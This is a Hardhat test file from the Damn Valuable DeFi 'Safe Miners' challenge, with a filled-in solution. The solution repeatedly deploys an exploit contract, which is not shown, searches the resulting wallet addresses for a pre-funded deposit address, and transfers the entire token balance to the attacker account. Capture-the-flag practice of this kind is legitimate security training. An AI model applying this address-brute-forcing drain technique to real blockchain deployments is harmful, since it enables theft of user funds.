import { ethers } from "hardhat";
import { expect } from "chai"

describe('[Challenge] Safe Miners', function () {
    const DEPOSIT_TOKEN_AMOUNT = ethers.utils.parseEther('2000042');
    const DEPOSIT_ADDRESS = '0x79658d35aB5c38B6b988C23D02e0410A380B8D5c';

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const accounts = await ethers.getSigners();
        const [deployer, attacker] = accounts;

        // Deploy Damn Valuable Token contract
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deposit the DVT tokens to the address
        await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await this.token.balanceOf(attacker.address)).eq('0');
    });

    it('Exploit', async function () {
        const accounts = await ethers.getSigners();
        const [deployer, attacker] = accounts;
        
        for (let i = 0; i < 100; i++) {
            const exploitCont = await (await ethers.getContractFactory('SafeMinersExploit', attacker)).deploy(attacker.address, 100, this.token.address);
            let addresses = await exploitCont.getWalletAddreses();
            console.log(addresses); 
            let found = addresses.find((e: any) => e == DEPOSIT_ADDRESS);
            console.log(found);
            if (found) {
                this.token.connect(attacker).transferFrom(DEPOSIT_ADDRESS, attacker.address, DEPOSIT_TOKEN_AMOUNT);
                break;
            }
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        const accounts = await ethers.getSigners();
        const [deployer, attacker] = accounts;
        // The attacker took all tokens available in the deposit address
        expect(
            await this.token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(DEPOSIT_TOKEN_AMOUNT);
    });
});